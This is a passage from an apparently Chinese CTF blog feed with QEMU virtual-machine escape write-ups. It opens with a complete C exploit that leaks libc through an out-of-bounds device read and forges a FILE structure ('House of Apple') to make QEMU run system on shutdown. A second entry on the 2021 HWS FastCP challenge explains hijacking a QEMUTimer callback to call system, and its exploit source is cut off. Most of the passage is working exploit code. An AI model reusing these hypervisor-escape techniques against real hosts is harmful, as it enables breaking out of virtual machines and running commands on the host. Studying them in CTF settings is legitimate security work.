class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEX(x) printf(<span class="string">"[*]0x%016llx\n"</span>, (unsigned long long)x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(addr) printf(<span class="string">"[*]%s\n"</span>, addr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOWMASK 0xffffffff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHMASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// typedef unsigned long long uint64_t;</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> pmio_base = <span class="number">0x000000000000c040</span>;</span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">char</span>* userbuf;</span><br><span class="line"><span class="type">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Err</span><span class="params">(<span class="type">char</span>* err)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        Err(<span class="string">"open pagemap"</span>);</span><br><span class="line">    }</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">va2pa</span><span class="params">(<span class="type">void</span> *addr)</span>{</span><br><span class="line">    <span class="type">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="type">size_t</span> offset = ((<span class="type">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"lseek"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"read"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>)))){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"page"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="type">size_t</span> phyaddr = pageframenum * pagesize + (<span class="type">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>{</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">uint32_t</span> *)( mmio_mem + addr );</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span>{</span><br><span class="line">        *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span>{</span><br><span class="line">    outl(val,addr);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_writeb</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint8_t</span> val)</span>{</span><br><span class="line">    outb(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_readb</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint8_t</span>)inb(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_mmio</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"Open pci"</span>);</span><br><span class="line">    }</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem&lt;<span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    }</span><br><span class="line">    LOG(<span class="string">"mmio_init"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pmio</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        Err(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line">    LOG(<span class="string">"pmio_init"</span>);</span><br><span class="line">    </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pa</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    LOG(<span class="string">"pa_init"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* passwd = <span class="string">"ACTF{cH3cK_1n_wI7h_B@by_C1ph3r_Te$t_1n_Q3MU_pl4yg3OuNd_1$_EASy!}"</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span></span><br><span class="line">{</span><br><span class="line">    mmio_write(<span class="number">0x40</span>,(addr&amp;<span class="number">0xffffffff</span>));</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0x10</span>,(val&amp;<span class="number">0xffffffff</span>));</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0x14</span>,(val&gt;&gt;<span class="number">32</span>));</span><br><span class="line">    LOG(<span class="string">"oobwrite!"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    init_pa();</span><br><span class="line">    init_mmio();</span><br><span class="line">    init_pmio();</span><br><span class="line"></span><br><span class="line"><span class="comment">// login</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x40</span>;i += <span class="number">4</span>)</span><br><span class="line">    {</span><br><span class="line">        mmio_write(i,*(<span class="type">uint32_t</span>*)(passwd+i));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    pmio_writeb(pmio_base+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> authentication = pmio_readb(pmio_base+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(authentication==<span class="number">1</span>)</span><br><span class="line">        LOG(<span class="string">"login successful"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        Err(<span class="string">"login fail"</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line"><span class="comment">// leak_libc</span></span><br><span class="line">    pmio_write(pmio_base+<span class="number">0x10</span>,<span class="string">'a'</span>);</span><br><span class="line">    <span class="type">uint32_t</span> buflow = mmio_read(<span class="number">0x40</span>);</span><br><span class="line">    HEX(buflow);</span><br><span class="line">    mmio_write(<span class="number">0x40</span>,(buflow&amp;<span class="number">0xff000000</span>)+<span class="number">0x8a0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> heap1  =  pmio_read(pmio_base+<span class="number">0x10</span>);</span><br><span class="line">    heap1 |= (pmio_read(pmio_base+<span class="number">0x14</span>)&lt;&lt;<span class="number">32</span>);</span><br><span class="line">    HEX(heap1);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x40</span>,(heap1+<span class="number">0x870</span>)&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> addr  =  pmio_read(pmio_base+<span class="number">0x10</span>);</span><br><span class="line">    addr |= (pmio_read(pmio_base+<span class="number">0x14</span>)&lt;&lt;<span class="number">32</span>);</span><br><span class="line">    HEX(addr);</span><br><span class="line">    <span class="comment">// libc_base = buf+0x51310e80 0x53d52f90</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> libc_base = addr - <span class="number">0x219C80</span>;</span><br><span class="line">    <span class="comment">// uint64_t libc_base = addr + 0x1912C80;</span></span><br><span class="line">    HEX(libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// house of apple</span></span><br><span class="line">    LOG(<span class="string">"House of Apple"</span>);</span><br><span class="line">    <span class="type">uint64_t</span> fake_io_addr  = (heap1 + <span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">uint64_t</span> _IO_wfile_jumps = libc_base + <span class="number">0x2160c0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> _IO_list_all_addr = libc_base + <span class="number">0x21a680</span>; </span><br><span class="line">    <span class="type">uint64_t</span> stdout_addt = libc_base + <span class="number">0x21a780</span>;</span><br><span class="line">    <span class="type">uint64_t</span> system_addr = libc_base + <span class="number">0x50d70</span>;</span><br><span class="line">    <span class="type">uint64_t</span> stdin_addr =  libc_base + <span class="number">0x219aa0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cmd[<span class="number">0x18</span>] = <span class="string">"  cat flag 1&gt;&amp;2"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">0x18</span>;i += <span class="number">8</span>)</span><br><span class="line">    {</span><br><span class="line">        oob_write(fake_io_addr+i,*(<span class="type">uint64_t</span>*)(cmd+i));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0x18</span>,<span class="number">0</span>);</span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0x28</span>,<span class="number">1</span>);</span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0x30</span>,<span class="number">0</span>);   </span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0x68</span>,system_addr);   </span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0xa0</span>,fake_io_addr);</span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0xd8</span>,_IO_wfile_jumps);</span><br><span class="line">    oob_write(fake_io_addr+<span class="number">0xe0</span>,fake_io_addr);</span><br><span class="line">    LOG(<span class="string">"Prepared!"</span>);</span><br><span class="line">    HEX(fake_io_addr);</span><br><span class="line"></span><br><span class="line">    oob_write(_IO_list_all_addr,fake_io_addr);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在关机的时候泄露出flag.有种引爆炸弹的感觉.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312011636968.png"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 HWS FastCP</title>
      <link href="/2023/2021%20HWS%20FastCP/"/>
      <url>/2023/2021%20HWS%20FastCP/</url>
      
        <content type="html"><![CDATA[<p>还是熟悉的越界读写,CP_buffer之后有个QEMUTIMER结构体,劫持其cb指针为system,opaque为cmd即可.<br>对QemuTimer Callback的回调机制可以看: <a href="https://hanqi-blogs.cn/2023/QemuTimer-Callback">QemuTimer Callback机制</a></p><span id="more"></span><p>关键结构体如下:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FastCPState</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  CP_state cp_state;</span><br><span class="line">  <span class="type">uint8_t</span> handling;</span><br><span class="line">  <span class="type">uint32_t</span> irq_status;</span><br><span class="line">  <span class="type">char</span> CP_buffer[<span class="number">4096</span>];</span><br><span class="line">  QEMUTimer_0 cp_timer;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CP_state</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">uint64_t</span> CP_list_src;</span><br><span class="line">  <span class="type">uint64_t</span> CP_list_cnt;</span><br><span class="line">  <span class="type">uint64_t</span> cmd;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">uint64_t</span> CP_src;</span><br><span class="line">  <span class="type">uint64_t</span> CP_cnt;</span><br><span class="line">  <span class="type">uint64_t</span> CP_dst;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">int64_t</span> expire_time;</span><br><span class="line">  QEMUTimerList_0 *timer_list;</span><br><span class="line">  QEMUTimerCB *cb;</span><br><span class="line">  <span class="type">void</span> *opaque;</span><br><span class="line">  QEMUTimer_0 *next;</span><br><span class="line">  <span class="type">int</span> attributes;</span><br><span class="line">  <span class="type">int</span> scale;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>要注意的一点是我们需要从指定的物理地址连续拷贝一页以上的数据到设备中,而mmap出的多个页面不一定在物理地址空间中连续,可以使用HugePage,其保证在物理内存中是连续的(在mmap中指定MAP_HUGETLB).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"sysctl vm.nr_hugepages=1"</span>); <span class="comment">//当然多一点也行</span></span><br><span class="line"><span class="type">char</span>* buf = mmap(<span class="literal">NULL</span>,<span class="number">2048</span>*<span class="number">1024</span>,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS|MAP_HUGETLB,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入页面使得物理内存正式分配.</span></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">'a'</span>,<span class="number">2048</span>*<span class="number">1024</span>);</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311292009419.png"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEX(x) printf(<span class="string">"[*]0x%016llx\n"</span>, (unsigned long long)x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(addr) printf(<span class="string">"[*]%s\n"</span>, addr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOWMASK 0xffffffff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHMASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// typedef unsigned long long uint64_t;</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pmio_base = <span class="number">0x000000000000c050</span>;</span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">char</span>* userbuf;</span><br><span class="line"><span class="type">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span>* MAGIC = <span class="string">"HANQING!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Err</span><span class="params">(<span class="type">char</span>* err)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, err);</span><br><span 